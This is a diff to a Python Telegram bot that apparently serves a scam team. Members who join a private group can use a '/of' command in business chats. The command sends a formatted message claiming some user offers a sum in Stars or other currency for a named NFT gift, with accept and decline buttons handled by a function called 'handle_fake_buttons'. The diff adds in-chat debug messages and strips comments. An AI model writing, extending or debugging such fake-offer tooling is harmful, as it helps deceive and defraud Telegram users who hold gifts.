@@ -14,10 +14,8 @@ dp = Dispatcher()
 TARGET_CHAT_ID = -1003747516067
 INVITE_LINK = "https://t.me/+Q7j5G8Y24_U5OWY6"
 
-# Множество для хранения ID тех, кто уже запросил доступ (сбрасывается при перезапуске)
 active_users = set()
 
-# Словарь с переводами
 MESSAGES = {
     "ru": {
         "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
@@ -65,7 +63,6 @@ async def is_subscribed(user_id: int) -> bool:
         print(f"Ошибка проверки подписки: {e}")
         return False
 
-# --- 1. СТАРТ И /ofteam ---
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
     if not await is_subscribed(message.from_user.id):
@@ -99,7 +96,6 @@ async def cmd_start(message: types.Message):
 async def cmd_ofteam(message: types.Message):
     if await is_subscribed(message.from_user.id):
         user_id = message.from_user.id
-        
         if user_id in active_users:
             await message.answer("✅ Доступ уже активен. Можно отправлять оферы.")
         else:
@@ -111,12 +107,10 @@ async def cmd_ofteam(message: types.Message):
         ])
         await message.answer("⚠️ Вы не подписаны на группу!", reply_markup=keyboard)
 
-# --- 2. БЛОКИРОВКА /of В ЛИЧКЕ ---
 @dp.message(F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- 3. СОЗДАНИЕ ОФФЕРА (В БИЗНЕС-ЧАТАХ) ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
@@ -138,6 +132,13 @@ async def handle_offer_command(message: types.Message):
 
     parts = message.text.split()
     if len(parts) < 4:
+        # Если формат неверный, сообщаем об этом (для отладки)
+        await bot.send_message(
+            chat_id=message.chat.id,
+            text="⚠️ <b>Неверный формат!</b>\nНужно: <code>/of ССЫЛКА ЦЕНА ВАЛЮТА ЯЗЫК</code>\nПример: <code>/of t.me/nft/DurovsCap-1234 500 stars ru</code>",
+            business_connection_id=business_connection_id,
+            parse_mode="HTML"
+        )
         return
 
     link = parts[1]
@@ -194,8 +195,17 @@ async def handle_offer_command(message: types.Message):
 
     except Exception as e:
         print(f"Ошибка отправки: {e}")
+        # ВЫВОДИМ ОШИБКУ В ЧАТ (чтобы ты видел, почему не отправляется)
+        try:
+            await bot.send_message(
+                chat_id=message.chat.id,
+                text=f"⚠️ <b>Ошибка при отправке оффера:</b>\n<code>{e}</code>",
+                business_connection_id=business_connection_id,
+                parse_mode="HTML"
+            )
+        except:
+            pass
 
-# --- 4. ОБРАБОТКА КНОПОК ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message:
